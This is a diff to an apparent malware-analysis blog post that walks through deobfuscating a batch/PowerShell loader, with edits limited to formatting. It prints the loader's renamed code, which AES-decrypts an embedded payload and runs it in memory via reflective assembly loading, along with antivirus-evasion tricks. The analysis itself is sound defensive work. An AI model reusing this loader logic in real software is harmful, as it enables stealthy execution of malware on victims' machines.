@@ -43,9 +43,9 @@ setlocal enabledelayedexpansion
 This was the first part of the obfuscation.
 
 
-From here, it is obvious from the last line that there is something going on with powershell. If you also look at the top a bit, we also see -noprofile -windowstyle hidden -ep bypass -command, which is also very common in malicious powershell operations. Something else that is going on here, which is a key clue, is [System.Security.Cryptography.Aes]::Create(), which is a .NET constructor for creating AES-encrypted objects. So, the next section likely decrypts and runs a payload, but lets dive deeper first. Lastly, we some concatenated strings, aimed at evading static AV detection ('S'+'ys'+'t'+'e'+'m'+'.E'+'nv'+'i'+'ro'+'n'+'me'+'n'+'t')
+From here, it is obvious from the last line that there is something going on with powershell. If you also look at the top a bit, we also see **-noprofile -windowstyle hidden -ep bypass -command**, which is also very common in malicious powershell operations. Something else that is going on here, which is a key clue, is **[System.Security.Cryptography.Aes]::Create()**, which is a .NET constructor for creating AES-encrypted objects. So, the next section likely decrypts and runs a payload, but lets dive deeper first. Lastly, we some concatenated strings, aimed at evading static AV detection (**'S'+'ys'+'t'+'e'+'m'+'.E'+'nv'+'i'+'ro'+'n'+'me'+'n'+'t'**)
 
-The dollar sign, $, denotes a variable in powershell. We see many more gibberish strings immediately preceded by the dollar signs, which means that the variables have been obfuscated. In this example, it is not through encoding or encryption, but rather their intention is obfuscated. It would be trivial for a computer to execute this code, but tough for a human to understand what is going on. From here, it is, at least in my experience, a game of guessing and renaming variables to what you think they might be. If you have no idea where to begin at guessing though, no problem! I find it good to just name things whatever, like var_1, var_2, and so on.
+The dollar sign, **$**, denotes a variable in powershell. We see many more gibberish strings immediately preceded by the dollar signs, which means that the variables have been obfuscated. In this example, it is not through encoding or encryption, but rather their intention is obfuscated. It would be trivial for a computer to execute this code, but tough for a human to understand what is going on. From here, it is, at least in my experience, a game of guessing and renaming variables to what you think they might be. If you have no idea where to begin at guessing though, no problem! I find it good to just name things whatever, like var_1, var_2, and so on.
 
 ~~~
 set "zsexdrzsexdrzsexdrzsexdrzsexdr=set"
@@ -63,16 +63,18 @@ $aesEncryptor.IV=[System.Convert]::FromBase64String('QUVTLUlW');
 $aesEncryptor.Padding=[System.Security.Cryptography.PaddingMode]::PKCS7;
 $aesEncryptor.Key=[System.Convert]::FromBase64String('QUVTLUtleQ==');
 $aesEncryptor.Mode=[System.Security.Cryptography.CipherMode]::CBC;
-function decrypt_function($param_var){
-$decryptor = $aesEncryptor.CreateDecryptor();
-$decrypted_bytes = $decryptor.TransformFinalBlock($param_var, 0, $param_var.Length);
-$decrypted_bytes;
-}
-function execute_function($param_var, $param2_var){
-$assembly = [System.Reflection.Assembly]::Load([byte[]]$param_var);
-$entry_point = $assembly.EntryPoint;
-$entry_point.Invoke($null, $param2_var);
-}
+function decrypt_function($param_var)
+  {
+  $decryptor = $aesEncryptor.CreateDecryptor();
+  $decrypted_bytes = $decryptor.TransformFinalBlock($param_var, 0, $param_var.Length);
+  $decrypted_bytes;
+  }
+function execute_function($param_var, $param2_var)
+  {
+  $assembly = [System.Reflection.Assembly]::Load([byte[]]$param_var);
+  $entry_point = $assembly.EntryPoint;
+  $entry_point.Invoke($null, $param2_var);
+  }
 $host.UI.RawUI.WindowTitle = $payloadFilePath;
 $fileType = [type]::GetType('System.IO.File');
 $envType = [type]::GetType('System.Environment');
@@ -80,11 +82,13 @@ $payloadFileContents = $fileType::ReadAllText($payloadFilePath);
 $newline = $envType::NewLine;
 $lines = $payloadFileContents.Split($newline);
 $lineArray = $lines;
-foreach ($line in $lineArray) {
-if ($line.StartsWith(':: ')) {
-$payloadDataEncoded = $line.Substring(3);
-break;
-}
-}
+foreach ($line in $lineArray)
+  {
+  if ($line.StartsWith(':: '))
+    {
+    $payloadDataEncoded = $line.Substring(3);
+    break;
+    }
+  }
 !delayed_var_2! "unknown"%systemdrive%\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe" "
 ~~~
